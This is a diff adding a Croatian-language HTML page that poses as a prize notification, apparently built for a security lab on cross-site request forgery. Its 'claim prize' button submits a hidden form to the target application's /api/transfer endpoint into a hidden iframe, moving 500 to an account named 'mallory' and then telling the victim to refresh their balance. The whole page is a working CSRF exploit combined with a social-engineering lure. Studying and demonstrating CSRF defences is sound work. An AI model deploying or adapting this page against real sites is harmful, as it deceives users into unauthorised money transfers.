@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+
+<html lang="hr">
+  <head>
+    <meta charset="utf-8">
+    <link rel="stylesheet" href="styles.css">
+    <title>Osvojite nagradu!</title>
+  </head>
+
+  <body class="att-body">
+    <main class="att-layout">
+      <section class="att-text">
+        <h1>🎁 Čestitamo! Osvojili ste nagradu!</h1>
+
+        <p>Kliknite gumb da je preuzmete.</p>
+        <p id="msg"></p>
+        <button id="go" type="button">Preuzmi nagradu</button>
+      </section>
+
+    </main>
+    
+    <form id="f" method="POST" target="hidden">
+      <input type="hidden" name="to" value="mallory">
+      <input type="hidden" name="amount" value="500">
+    </form>
+    <iframe name="hidden"></iframe>
+
+    <script src="/config.js"></script>
+    <script>
+      document.getElementById('go').onclick = () => {
+        const f = document.getElementById('f');
+        f.action = window.BASE_URL.replace(/\/$/, '') + '/api/transfer';
+        f.submit();
+        document.getElementById('msg').textContent =
+          'Zahtjev poslan. Vratite se u aplikaciju i osvježite stanje.';
+      };
+    </script>
+  </body>
+</html>
